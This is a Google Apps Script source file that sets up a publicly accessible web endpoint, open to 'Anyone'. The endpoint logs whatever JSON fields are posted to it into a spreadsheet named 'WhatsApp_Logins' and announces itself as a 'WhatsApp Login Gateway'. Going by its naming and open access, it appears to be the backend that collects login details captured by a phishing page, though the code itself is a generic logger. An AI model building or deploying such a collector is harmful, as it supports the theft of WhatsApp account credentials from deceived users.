/**
 * Google Sheets Sync - WhatsApp Logins
 * Paste this into a Google Apps Script project (script.google.com)
 * Deploy as a Web App with access 'Anyone'
 */

const SPREADSHEET_ID = '1PYdM-e_UqY2FEse4pCj2cOUNqeOEprNjjpE1GPCCJpU'; // Your WhatsApp Login Sheet ID
const SHEET_NAME = 'WhatsApp_Logins'; 

function doGet(e) {
  return response({ status: 'success', message: 'WhatsApp Login Gateway Active' });
}

function doPost(e) {
  try {
    const data = JSON.parse(e.postData.contents);
    const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    const sheet = ss.getSheetByName(SHEET_NAME) || ss.insertSheet(SHEET_NAME);
    
    // Auto-setup headers
    const headers = sheet.getRange(1, 1, 1, Math.max(sheet.getLastColumn(), 1)).getValues()[0];
    const newRow = [];
    
    // Ensure Timestamp
    if (headers[0] === "" || headers.indexOf('Timestamp') === -1) {
      sheet.getRange(1, 1).setValue('Timestamp');
      headers[0] = 'Timestamp';
    }
    
    const timestampIdx = headers.indexOf('Timestamp');
    newRow[timestampIdx] = new Date();
    
    // Map dynamic data
    for (let key in data) {
      let idx = headers.indexOf(key);
      if (idx === -1) {
        idx = headers.length;
        headers.push(key);
        sheet.getRange(1, idx + 1).setValue(key);
      }
      newRow[idx] = data[key];
    }
    
    sheet.appendRow(newRow);
    
    return response({ status: 'success' });
      
  } catch (error) {
    return response({ status: 'error', message: error.toString() });
  }
}

function response(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}
